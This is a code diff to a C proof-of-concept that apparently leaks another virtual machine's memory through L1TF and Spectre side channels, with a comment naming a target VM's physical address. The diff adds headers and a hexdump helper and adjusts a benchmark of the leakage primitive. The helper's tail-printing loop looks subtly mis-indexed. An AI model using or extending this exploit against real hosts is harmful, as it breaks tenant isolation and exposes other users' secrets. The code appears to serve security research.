@@ -1,3 +1,20 @@
+#include <assert.h>
+#include <ctype.h>
+#include <err.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/mman.h>
+#include <time.h>
+#include <unistd.h>
+#include "constants.h"
+#include "helpers.h"
+#include "hypercall.h"
+#include "l1tf.h"
+#include "spectre.h"
+#include "util.h"
+#include "timing.h"
 
 // rain-vm-gce's data at pa 0x8a6de5e00+0x100
 char secret[] = {
@@ -13,6 +30,29 @@ void initial_secret_recovery(uintptr_t base)
 	half_spectre_start(base, leak_pa);
 	l1tf_do_leak(leak_pa, 0x10);
 	half_spectre_stop();
+}
+
+void display(void *data, int len)
+{
+	#define c(x) (isprint(x) ? x : '.')
+	uint8_t *p = data;
+	int i;
+	for (i = 0; i < len/8; i++) {
+		printf("%4x:  %16lx   %02x %02x %02x %02x %02x %02x %02x %02x %c%c%c%c%c%c%c%c\n", 8*i, *(uint64_t *)(p+8*i),
+		p[8*i+0], p[8*i+1], p[8*i+2], p[8*i+3], p[8*i+4], p[8*i+5], p[8*i+6], p[8*i+7],
+		c(p[8*i+0]), c(p[8*i+1]), c(p[8*i+2]), c(p[8*i+3]), c(p[8*i+4]), c(p[8*i+5]), c(p[8*i+6]), c(p[8*i+7]));
+	}
+	if (len > 8*i) {
+		printf("%4x:                  ", 8*i);
+		for (int j = 8*i; j < len; j++)
+			printf("%02x ", p[8*i+j]);
+		for (int j = len; j < 9*i; j++)
+			printf("   ");
+		printf("  ");
+		for (int j = 8*i; j < len; j++)
+			printf("%c", c(p[8*i+j]));
+		printf("\n");
+	}
 }
 
 void display_data(char *data)
@@ -73,7 +113,7 @@ int check_correctness(char *data)
 
 void benchmark_leakage_primitive(uintptr_t base)
 {
-	char *data;
+	char data[0x40];
 	int errors;
 	uint64_t t0;
 	double time;
@@ -82,10 +122,9 @@ void benchmark_leakage_primitive(uintptr_t base)
 	display_data(secret);
 	for (int i = 0; i < 3; i++) {
 		t0 = clock_read();
-		data = thijs_l1tf_leak(base, leak_pa + 0x40, 0x40);
+		thijs_l1tf_leak(data, base, leak_pa + 0x40, 0x40);
 		time = (clock_read()-t0)/1000000000.0;
 		errors = check_correctness(data);
-		free(data);
 		printf("time = %8.1f | errors = %3d\n", time, errors);
 	}
 }
